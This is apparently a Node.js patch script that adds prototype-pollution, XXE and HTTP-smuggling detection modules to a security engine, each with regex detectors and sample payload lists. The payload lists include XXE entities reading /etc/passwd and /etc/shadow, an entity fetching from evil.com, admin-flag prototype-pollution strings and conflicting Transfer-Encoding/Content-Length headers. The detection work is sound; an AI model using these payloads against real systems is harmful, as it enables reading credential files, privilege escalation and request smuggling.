const fs = require('fs');
const miscPath = 'packages/engine/src/classes/injection/misc.ts';
const indexPath = 'packages/engine/src/classes/injection/index.ts';

let miscContent = fs.readFileSync(miscPath, 'utf8');

if (!miscContent.includes('id: \'proto_pollution\'')) {
miscContent += `

export const protoPollutionMisc: InvariantClassModule = {
    id: 'proto_pollution',
    description: 'Prototype Pollution',
    category: 'injection',
    severity: 'high',
    knownPayloads: ['__proto__[admin]=true', 'constructor.prototype.isAdmin=true', '{"__proto__":{"polluted":true}}', 'Object.prototype.toString=function(){}'],
    knownBenign: ['prototype pattern in code review', 'check constructor', 'class extends Animal'],
    detect: (input: string): boolean => {
        const d = deepDecode(input);
        return /__proto__\\s*[\\[.":]|constructor\\s*\\.prototype\\s*[\\[.]|Object\\s*\\.\\s*prototype\\s*[\\[.]/i.test(d);
    },
    detectL2: (input: string) => null,
    generateVariants: (count: number): string[] => {
        const v = ['__proto__[admin]=true', 'constructor.prototype.isAdmin=true', '{"__proto__":{"polluted":true}}', 'Object.prototype.toString=function(){}'];
        const r: string[] = [];
        for (let i = 0; i < count; i++) r.push(v[i % v.length]);
        return r;
    }
};

export const xxeInjection: InvariantClassModule = {
    id: 'xxe_injection',
    description: 'XXE Injection',
    category: 'injection',
    severity: 'critical',
    knownPayloads: ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', '<?xml version="1.0"?><!ENTITY % xxe SYSTEM "http://evil.com/xxe">', '<!ENTITY xxe SYSTEM "file:///etc/shadow">'],
    knownBenign: ['xml version="1.0" encoding="UTF-8"?>', '<!DOCTYPE html PUBLIC', 'valid xml document'],
    detect: (input: string): boolean => {
        const d = deepDecode(input);
        return /<\\!(?:DOCTYPE|ENTITY)\\s+[^>]*(?:SYSTEM|PUBLIC)\\s+['"][^'"]+['"]/i.test(d);
    },
    detectL2: (input: string) => null,
    generateVariants: (count: number): string[] => {
        const v = ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', '<?xml version="1.0"?><!ENTITY % xxe SYSTEM "http://evil.com/xxe">', '<!ENTITY xxe SYSTEM "file:///etc/shadow">'];
        const r: string[] = [];
        for (let i = 0; i < count; i++) r.push(v[i % v.length]);
        return r;
    }
};

export const httpSmuggling: InvariantClassModule = {
    id: 'http_smuggling',
    description: 'HTTP Request Smuggling',
    category: 'injection',
    severity: 'critical',
    knownPayloads: ['Transfer-Encoding: chunked\\r\\nContent-Length: 0', 'GET / HTTP/1.1\\r\\nHost: internal\\r\\nTransfer-Encoding: chunked', 'POST / HTTP/1.1\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked'],
    knownBenign: ['Content-Type: application/json', 'Content-Length: 42', 'HTTP/1.1 200 OK'],
    detect: (input: string): boolean => {
        const d = deepDecode(input);
        return /transfer-encoding\\s*:.*?(?:chunked|identity)[\\s\\S]*?content-length\\s*:|content-length\\s*:\\s*\\d+[\\s\\S]*?transfer-encoding\\s*:|transfer-encoding\\s*:\\s*chunked/i.test(d);
    },
    detectL2: (input: string) => null,
    generateVariants: (count: number): string[] => {
        const v = ['Transfer-Encoding: chunked\\r\\nContent-Length: 0', 'GET / HTTP/1.1\\r\\nHost: internal\\r\\nTransfer-Encoding: chunked', 'POST / HTTP/1.1\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked'];
        const r: string[] = [];
        for (let i = 0; i < count; i++) r.push(v[i % v.length]);
        return r;
    }
};
`;
fs.writeFileSync(miscPath, miscContent);
}

let indexContent = fs.readFileSync(indexPath, 'utf8');
if (!indexContent.includes('xxeInjection')) {
    indexContent = indexContent.replace(
        `import { openRedirectBypass, ldapFilterInjection, regexDos } from './misc.js'`,
        `import { openRedirectBypass, ldapFilterInjection, regexDos, protoPollutionMisc, xxeInjection, httpSmuggling } from './misc.js'`
    );
    indexContent = indexContent.replace(
        `export { openRedirectBypass, ldapFilterInjection, regexDos } from './misc.js'`,
        `export { openRedirectBypass, ldapFilterInjection, regexDos, protoPollutionMisc, xxeInjection, httpSmuggling } from './misc.js'`
    );
    indexContent = indexContent.replace(
        `openRedirectBypass,`,
        `openRedirectBypass,
    protoPollutionMisc,
    xxeInjection,
    httpSmuggling,`
    );
    fs.writeFileSync(indexPath, indexContent);
}

let typesContent = fs.readFileSync('packages/engine/src/classes/types.ts', 'utf8');
if (!typesContent.includes('xxe_injection')) {
    typesContent = typesContent.replace(`| 'xml_injection'`, `| 'xml_injection'\n    | 'xxe_injection'\n    | 'http_smuggling'`);
    fs.writeFileSync('packages/engine/src/classes/types.ts', typesContent);
}
